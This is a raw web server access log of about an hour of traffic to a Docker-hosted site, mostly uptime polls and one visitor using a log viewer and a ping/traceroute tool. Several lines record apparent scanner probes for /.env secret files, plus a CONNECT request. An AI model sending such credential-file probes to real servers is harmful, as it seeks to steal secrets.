167.71.120.76 - - [19/Dec/2023:05:38:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8326 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:05:39:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8327 "www@docker" "http://172.18.0.9:80" 0ms
193.118.51.134 - - [19/Dec/2023:05:39:33 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 8328 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:05:39:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8329 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:05:40:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8330 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:05:40:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8331 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:05:41:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8332 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:05:41:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8333 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:05:42:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8334 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:05:42:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8335 "www@docker" "http://172.18.0.9:80" 1ms
95.214.235.169 - - [19/Dec/2023:05:43:20 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 8336 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:05:43:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8337 "www@docker" "http://172.18.0.9:80" 0ms
95.214.235.169 - - [19/Dec/2023:05:43:21 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 8338 "web-to-websecure@internal" "-" 0ms
90.151.171.106 - - [19/Dec/2023:05:43:29 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 8339 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:05:43:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8340 "www@docker" "http://172.18.0.9:80" 1ms
90.151.171.106 - - [19/Dec/2023:05:43:40 +0000] "GET ?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 8341 "web-to-websecure@internal" "-" 0ms
173.48.140.140 - - [19/Dec/2023:05:44:17 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 8342 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:44:17 +0000] "GET /logs/styles.css?version=16 HTTP/2.0" 304 0 "-" "-" 8343 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:44:17 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2490 "-" "-" 8344 "www@docker" "http://172.18.0.9:80" 26ms
159.203.109.206 - - [19/Dec/2023:05:44:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8345 "www@docker" "http://172.18.0.9:80" 0ms
172.203.187.48 - - [19/Dec/2023:05:44:23 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8346 "web-to-websecure@internal" "-" 0ms
173.48.140.140 - - [19/Dec/2023:05:44:26 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 8347 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:44:26 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2554 "-" "-" 8348 "www@docker" "http://172.18.0.9:80" 192ms
173.48.140.140 - - [19/Dec/2023:05:44:34 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 2492 "-" "-" 8349 "www@docker" "http://172.18.0.9:80" 52ms
167.71.120.76 - - [19/Dec/2023:05:44:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8350 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:44:41 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2656 "-" "-" 8351 "www@docker" "http://172.18.0.9:80" 28ms
159.203.109.206 - - [19/Dec/2023:05:45:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8352 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:45:27 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 2371 "-" "-" 8353 "www@docker" "http://172.18.0.9:80" 29ms
167.71.120.76 - - [19/Dec/2023:05:45:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8354 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:45:49 +0000] "GET /logs/logtail.php?page=2 HTTP/2.0" 200 2505 "-" "-" 8355 "www@docker" "http://172.18.0.9:80" 32ms
173.48.140.140 - - [19/Dec/2023:05:45:53 +0000] "GET /logs/logtail.php?page=3 HTTP/2.0" 200 2895 "-" "-" 8356 "www@docker" "http://172.18.0.9:80" 23ms
173.48.140.140 - - [19/Dec/2023:05:45:54 +0000] "GET /logs/logtail.php?page=4 HTTP/2.0" 200 3092 "-" "-" 8357 "www@docker" "http://172.18.0.9:80" 26ms
173.48.140.140 - - [19/Dec/2023:05:45:56 +0000] "GET /logs/logtail.php?page=5 HTTP/2.0" 200 2585 "-" "-" 8358 "www@docker" "http://172.18.0.9:80" 30ms
159.203.109.206 - - [19/Dec/2023:05:46:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8359 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:05:46:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8360 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:46:46 +0000] "GET /logs/logtail.php?page=6 HTTP/2.0" 200 2660 "-" "-" 8361 "www@docker" "http://172.18.0.9:80" 36ms
173.48.140.140 - - [19/Dec/2023:05:46:51 +0000] "GET /logs/logtail.php?page=7 HTTP/2.0" 200 3092 "-" "-" 8362 "www@docker" "http://172.18.0.9:80" 47ms
173.48.140.140 - - [19/Dec/2023:05:46:52 +0000] "GET /logs/logtail.php?page=8 HTTP/2.0" 200 3196 "-" "-" 8363 "www@docker" "http://172.18.0.9:80" 48ms
173.48.140.140 - - [19/Dec/2023:05:46:54 +0000] "GET /logs/logtail.php?page=9 HTTP/2.0" 200 3062 "-" "-" 8364 "www@docker" "http://172.18.0.9:80" 47ms
173.48.140.140 - - [19/Dec/2023:05:46:56 +0000] "GET /logs/logtail.php?page=10 HTTP/2.0" 200 3181 "-" "-" 8365 "www@docker" "http://172.18.0.9:80" 49ms
95.214.235.169 - - [19/Dec/2023:05:47:01 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 8366 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [19/Dec/2023:05:47:02 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 8367 "web-to-websecure@internal" "-" 0ms
173.48.140.140 - - [19/Dec/2023:05:47:09 +0000] "GET /logs/logtail.php?page=11 HTTP/2.0" 200 2994 "-" "-" 8368 "www@docker" "http://172.18.0.9:80" 73ms
173.48.140.140 - - [19/Dec/2023:05:47:16 +0000] "GET /logs/logtail.php?page=12 HTTP/2.0" 200 2972 "-" "-" 8369 "www@docker" "http://172.18.0.9:80" 74ms
159.203.109.206 - - [19/Dec/2023:05:47:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8370 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:47:26 +0000] "GET /logs/logtail.php?page=13 HTTP/2.0" 200 3024 "-" "-" 8371 "www@docker" "http://172.18.0.9:80" 57ms
173.48.140.140 - - [19/Dec/2023:05:47:28 +0000] "GET /logs/logtail.php?page=14 HTTP/2.0" 200 2935 "-" "-" 8372 "www@docker" "http://172.18.0.9:80" 66ms
173.48.140.140 - - [19/Dec/2023:05:47:29 +0000] "GET /logs/logtail.php?page=15 HTTP/2.0" 200 2696 "-" "-" 8373 "www@docker" "http://172.18.0.9:80" 69ms
173.48.140.140 - - [19/Dec/2023:05:47:31 +0000] "GET /logs/logtail.php?page=16 HTTP/2.0" 200 2502 "-" "-" 8374 "www@docker" "http://172.18.0.9:80" 77ms
173.48.140.140 - - [19/Dec/2023:05:47:33 +0000] "GET /logs/logtail.php?page=17 HTTP/2.0" 200 2880 "-" "-" 8375 "www@docker" "http://172.18.0.9:80" 160ms
167.71.120.76 - - [19/Dec/2023:05:47:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8376 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:47:37 +0000] "GET /logs/logtail.php?page=18 HTTP/2.0" 200 2932 "-" "-" 8377 "www@docker" "http://172.18.0.9:80" 116ms
173.48.140.140 - - [19/Dec/2023:05:47:39 +0000] "GET /logs/logtail.php?page=19 HTTP/2.0" 200 3092 "-" "-" 8378 "www@docker" "http://172.18.0.9:80" 121ms
173.48.140.140 - - [19/Dec/2023:05:47:41 +0000] "GET /logs/logtail.php?page=20 HTTP/2.0" 200 3138 "-" "-" 8379 "www@docker" "http://172.18.0.9:80" 108ms
173.48.140.140 - - [19/Dec/2023:05:47:42 +0000] "GET /logs/logtail.php?page=21 HTTP/2.0" 200 3009 "-" "-" 8380 "www@docker" "http://172.18.0.9:80" 110ms
173.48.140.140 - - [19/Dec/2023:05:47:44 +0000] "GET /logs/logtail.php?page=22 HTTP/2.0" 200 3066 "-" "-" 8381 "www@docker" "http://172.18.0.9:80" 108ms
173.48.140.140 - - [19/Dec/2023:05:47:45 +0000] "GET /logs/logtail.php?page=23 HTTP/2.0" 200 2781 "-" "-" 8382 "www@docker" "http://172.18.0.9:80" 125ms
173.48.140.140 - - [19/Dec/2023:05:47:46 +0000] "GET /logs/logtail.php?page=24 HTTP/2.0" 200 3248 "-" "-" 8383 "www@docker" "http://172.18.0.9:80" 118ms
173.48.140.140 - - [19/Dec/2023:05:47:46 +0000] "GET /logs/logtail.php?page=25 HTTP/2.0" 200 3089 "-" "-" 8384 "www@docker" "http://172.18.0.9:80" 124ms
57.129.23.166 - - [19/Dec/2023:05:47:57 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 8387 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [19/Dec/2023:05:47:58 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 8388 "web-to-websecure@internal" "-" 0ms
173.48.140.140 - - [19/Dec/2023:05:47:50 +0000] "GET /logs/logtail.php?page=27 HTTP/2.0" 200 2733 "-" "-" 8386 "www@docker" "http://172.18.0.9:80" 8417ms
173.48.140.140 - - [19/Dec/2023:05:47:48 +0000] "GET /logs/logtail.php?page=26 HTTP/2.0" 200 2809 "-" "-" 8385 "www@docker" "http://172.18.0.9:80" 10615ms
173.48.140.140 - - [19/Dec/2023:05:47:59 +0000] "GET /logs/logtail.php?page=28 HTTP/2.0" 200 2612 "-" "-" 8389 "www@docker" "http://172.18.0.9:80" 170ms
173.48.140.140 - - [19/Dec/2023:05:48:12 +0000] "GET /logs/logtail.php?page=29 HTTP/2.0" 200 2965 "-" "-" 8390 "www@docker" "http://172.18.0.9:80" 157ms
173.48.140.140 - - [19/Dec/2023:05:48:18 +0000] "GET /logs/logtail.php?page=30 HTTP/2.0" 200 2759 "-" "-" 8391 "www@docker" "http://172.18.0.9:80" 162ms
159.203.109.206 - - [19/Dec/2023:05:48:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8392 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:48:22 +0000] "GET /logs/logtail.php?page=31 HTTP/2.0" 200 2740 "-" "-" 8393 "www@docker" "http://172.18.0.9:80" 203ms
173.48.140.140 - - [19/Dec/2023:05:48:24 +0000] "GET /logs/logtail.php?page=32 HTTP/2.0" 200 2641 "-" "-" 8394 "www@docker" "http://172.18.0.9:80" 239ms
167.71.120.76 - - [19/Dec/2023:05:48:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8395 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:48:41 +0000] "GET /logs/logtail.php?page=33 HTTP/2.0" 200 2930 "-" "-" 8396 "www@docker" "http://172.18.0.9:80" 273ms
159.203.109.206 - - [19/Dec/2023:05:49:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8397 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:05:49:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8398 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:05:50:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8400 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:50:21 +0000] "GET /logs/logtail.php?page=34 HTTP/2.0" 200 2847 "-" "-" 8399 "www@docker" "http://172.18.0.9:80" 226ms
173.48.140.140 - - [19/Dec/2023:05:50:26 +0000] "GET /logs/logtail.php?page=35 HTTP/2.0" 200 2857 "-" "-" 8401 "www@docker" "http://172.18.0.9:80" 237ms
167.71.120.76 - - [19/Dec/2023:05:50:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8402 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:51:12 +0000] "GET /logs/logtail.php?page=36 HTTP/2.0" 200 2972 "-" "-" 8403 "www@docker" "http://172.18.0.9:80" 265ms
173.48.140.140 - - [19/Dec/2023:05:51:14 +0000] "GET /logs/logtail.php?page=37 HTTP/2.0" 200 2807 "-" "-" 8404 "www@docker" "http://172.18.0.9:80" 224ms
173.48.140.140 - - [19/Dec/2023:05:51:16 +0000] "GET /logs/logtail.php?page=38 HTTP/2.0" 200 2372 "-" "-" 8405 "www@docker" "http://172.18.0.9:80" 225ms
159.203.109.206 - - [19/Dec/2023:05:51:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8406 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:05:51:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8407 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:51:54 +0000] "GET /logs/logtail.php?page=39 HTTP/2.0" 200 2657 "-" "-" 8408 "www@docker" "http://172.18.0.9:80" 263ms
173.48.140.140 - - [19/Dec/2023:05:51:58 +0000] "GET /logs/logtail.php?page=40 HTTP/2.0" 200 2356 "-" "-" 8409 "www@docker" "http://172.18.0.9:80" 335ms
173.48.140.140 - - [19/Dec/2023:05:52:01 +0000] "GET /logs/logtail.php?page=41 HTTP/2.0" 200 2538 "-" "-" 8410 "www@docker" "http://172.18.0.9:80" 258ms
173.48.140.140 - - [19/Dec/2023:05:52:03 +0000] "GET /logs/logtail.php?page=40 HTTP/2.0" 200 2399 "-" "-" 8411 "www@docker" "http://172.18.0.9:80" 248ms
172.203.187.48 - - [19/Dec/2023:05:52:04 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8412 "web-to-websecure@internal" "-" 0ms
173.48.140.140 - - [19/Dec/2023:05:52:11 +0000] "GET /logs/logtail.php?page=41 HTTP/2.0" 200 2528 "-" "-" 8413 "www@docker" "http://172.18.0.9:80" 220ms
173.48.140.140 - - [19/Dec/2023:05:52:14 +0000] "GET /logs/logtail.php?page=42 HTTP/2.0" 200 2370 "-" "-" 8414 "www@docker" "http://172.18.0.9:80" 251ms
159.203.109.206 - - [19/Dec/2023:05:52:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8415 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:52:35 +0000] "GET /logs/logtail.php?page=43 HTTP/2.0" 200 2808 "-" "-" 8416 "www@docker" "http://172.18.0.9:80" 243ms
167.71.120.76 - - [19/Dec/2023:05:52:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8417 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:52:39 +0000] "GET /logs/logtail.php?page=44 HTTP/2.0" 200 2599 "-" "-" 8418 "www@docker" "http://172.18.0.9:80" 246ms
173.48.140.140 - - [19/Dec/2023:05:52:44 +0000] "GET /logs/logtail.php?page=45 HTTP/2.0" 200 2649 "-" "-" 8419 "www@docker" "http://172.18.0.9:80" 345ms
173.48.140.140 - - [19/Dec/2023:05:52:46 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2929 "-" "-" 8420 "www@docker" "http://172.18.0.9:80" 23ms
173.48.140.140 - - [19/Dec/2023:05:52:58 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 8421 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:52:58 +0000] "GET /logs/styles.css?version=16 HTTP/2.0" 304 0 "-" "-" 8422 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:52:59 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2957 "-" "-" 8423 "www@docker" "http://172.18.0.9:80" 20ms
173.48.140.140 - - [19/Dec/2023:05:53:05 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 8424 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:53:05 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2990 "-" "-" 8425 "www@docker" "http://172.18.0.9:80" 23ms
159.203.109.206 - - [19/Dec/2023:05:53:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8426 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:53:21 +0000] "GET /trace/ HTTP/2.0" 200 6089 "-" "-" 8427 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [19/Dec/2023:05:53:21 +0000] "GET /trace/styles.css?version=16 HTTP/2.0" 304 0 "-" "-" 8428 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:53:30 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 8429 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:53:30 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2952 "-" "-" 8430 "www@docker" "http://172.18.0.9:80" 21ms
167.71.120.76 - - [19/Dec/2023:05:53:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8431 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:53:39 +0000] "GET /trace/ HTTP/2.0" 200 6089 "-" "-" 8432 "livetrace@docker" "http://172.18.0.3:80" 3ms
173.48.140.140 - - [19/Dec/2023:05:53:51 +0000] "GET /trace/startping.php?id=d8pt8gaz2 HTTP/2.0" 200 105 "-" "-" 8433 "livetrace@docker" "http://172.18.0.3:80" 3ms
173.48.140.140 - - [19/Dec/2023:05:53:51 +0000] "GET /trace/starttrace.php?id=16nbvhpnu HTTP/2.0" 200 106 "-" "-" 8434 "livetrace@docker" "http://172.18.0.3:80" 5ms
173.48.140.140 - - [19/Dec/2023:05:53:52 +0000] "GET /trace/pollping.php?id=d8pt8gaz2 HTTP/2.0" 200 33 "-" "-" 8435 "livetrace@docker" "http://172.18.0.3:80" 3ms
173.48.140.140 - - [19/Dec/2023:05:53:52 +0000] "GET /trace/polltrace.php?id=16nbvhpnu HTTP/2.0" 200 460 "-" "-" 8436 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:05:53:53 +0000] "GET /trace/pollping.php?id=d8pt8gaz2 HTTP/2.0" 200 56 "-" "-" 8437 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:53:53 +0000] "GET /trace/polltrace.php?id=16nbvhpnu HTTP/2.0" 200 460 "-" "-" 8438 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:53:54 +0000] "GET /trace/pollping.php?id=d8pt8gaz2 HTTP/2.0" 200 80 "-" "-" 8439 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:05:53:54 +0000] "GET /trace/polltrace.php?id=16nbvhpnu HTTP/2.0" 200 460 "-" "-" 8440 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:53:55 +0000] "GET /trace/pollping.php?id=d8pt8gaz2 HTTP/2.0" 200 100 "-" "-" 8441 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:53:55 +0000] "GET /trace/polltrace.php?id=16nbvhpnu HTTP/2.0" 200 738 "-" "-" 8442 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:53:55 +0000] "GET /trace/cleantrace.php?id=16nbvhpnu HTTP/2.0" 200 72 "-" "-" 8443 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:05:53:56 +0000] "GET /trace/pollping.php?id=d8pt8gaz2 HTTP/2.0" 200 131 "-" "-" 8444 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:05:53:57 +0000] "GET /trace/pollping.php?id=d8pt8gaz2 HTTP/2.0" 200 149 "-" "-" 8445 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:53:58 +0000] "GET /trace/pollping.php?id=d8pt8gaz2 HTTP/2.0" 200 174 "-" "-" 8446 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:53:59 +0000] "GET /trace/pollping.php?id=d8pt8gaz2 HTTP/2.0" 200 195 "-" "-" 8447 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:53:59 +0000] "GET /trace/cleanping.php?id=d8pt8gaz2 HTTP/2.0" 200 71 "-" "-" 8448 "livetrace@docker" "http://172.18.0.3:80" 2ms
159.203.109.206 - - [19/Dec/2023:05:54:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8449 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:05:54:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8450 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:05:55:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8451 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:05:55:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8452 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:05:56:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8453 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:05:56:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8454 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:57:04 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8455 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:57:04 +0000] "GET /styles.css HTTP/2.0" 200 326 "-" "-" 8456 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:57:04 +0000] "GET /favicon.ico HTTP/2.0" 404 153 "-" "-" 8457 "www@docker" "http://172.18.0.9:80" 5ms
173.48.140.140 - - [19/Dec/2023:05:57:15 +0000] "GET /trace/ HTTP/2.0" 200 6089 "-" "-" 8458 "livetrace@docker" "http://172.18.0.3:80" 5ms
173.48.140.140 - - [19/Dec/2023:05:57:15 +0000] "GET /trace/styles.css?version=16 HTTP/2.0" 200 1422 "-" "-" 8459 "livetrace@docker" "http://172.18.0.3:80" 1ms
159.203.109.206 - - [19/Dec/2023:05:57:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8460 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:57:23 +0000] "GET /trace/startping.php?id=h1ezvagc9 HTTP/2.0" 200 105 "-" "-" 8461 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [19/Dec/2023:05:57:23 +0000] "GET /trace/starttrace.php?id=dz5zdrtgs HTTP/2.0" 200 106 "-" "-" 8462 "livetrace@docker" "http://172.18.0.3:80" 6ms
173.48.140.140 - - [19/Dec/2023:05:57:24 +0000] "GET /trace/polltrace.php?id=dz5zdrtgs HTTP/2.0" 200 428 "-" "-" 8464 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:57:24 +0000] "GET /trace/pollping.php?id=h1ezvagc9 HTTP/2.0" 200 34 "-" "-" 8463 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [19/Dec/2023:05:57:25 +0000] "GET /trace/pollping.php?id=h1ezvagc9 HTTP/2.0" 200 59 "-" "-" 8465 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:05:57:25 +0000] "GET /trace/polltrace.php?id=dz5zdrtgs HTTP/2.0" 200 428 "-" "-" 8466 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:05:57:26 +0000] "GET /trace/pollping.php?id=h1ezvagc9 HTTP/2.0" 200 85 "-" "-" 8467 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:57:26 +0000] "GET /trace/polltrace.php?id=dz5zdrtgs HTTP/2.0" 200 428 "-" "-" 8468 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:05:57:27 +0000] "GET /trace/pollping.php?id=h1ezvagc9 HTTP/2.0" 200 111 "-" "-" 8469 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:57:27 +0000] "GET /trace/polltrace.php?id=dz5zdrtgs HTTP/2.0" 200 707 "-" "-" 8470 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:05:57:27 +0000] "GET /trace/cleantrace.php?id=dz5zdrtgs HTTP/2.0" 200 72 "-" "-" 8471 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:05:57:28 +0000] "GET /trace/pollping.php?id=h1ezvagc9 HTTP/2.0" 200 135 "-" "-" 8472 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:57:29 +0000] "GET /trace/pollping.php?id=h1ezvagc9 HTTP/2.0" 200 162 "-" "-" 8473 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:57:30 +0000] "GET /trace/pollping.php?id=h1ezvagc9 HTTP/2.0" 200 187 "-" "-" 8474 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:57:31 +0000] "GET /trace/pollping.php?id=h1ezvagc9 HTTP/2.0" 200 202 "-" "-" 8475 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:05:57:31 +0000] "GET /trace/cleanping.php?id=h1ezvagc9 HTTP/2.0" 200 71 "-" "-" 8476 "livetrace@docker" "http://172.18.0.3:80" 2ms
167.71.120.76 - - [19/Dec/2023:05:57:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8477 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [19/Dec/2023:05:57:47 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8478 "web-to-websecure@internal" "-" 0ms
173.48.140.140 - - [19/Dec/2023:05:58:19 +0000] "GET /logs HTTP/2.0" 301 169 "-" "-" 8479 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:58:19 +0000] "GET /logs/ HTTP/1.1" 301 17 "-" "-" 8480 "web-to-websecure@internal" "-" 0ms
173.48.140.140 - - [19/Dec/2023:05:58:19 +0000] "GET /logs/ HTTP/2.0" 200 2472 "-" "-" 8481 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:58:19 +0000] "GET /logs/styles.css?version=16 HTTP/2.0" 200 1864 "-" "-" 8482 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:58:19 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 3094 "-" "-" 8483 "www@docker" "http://172.18.0.9:80" 27ms
159.203.109.206 - - [19/Dec/2023:05:58:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8484 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:05:58:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8485 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:05:59:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8486 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:05:59:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8487 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:06:00:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8488 "www@docker" "http://172.18.0.9:80" 0ms
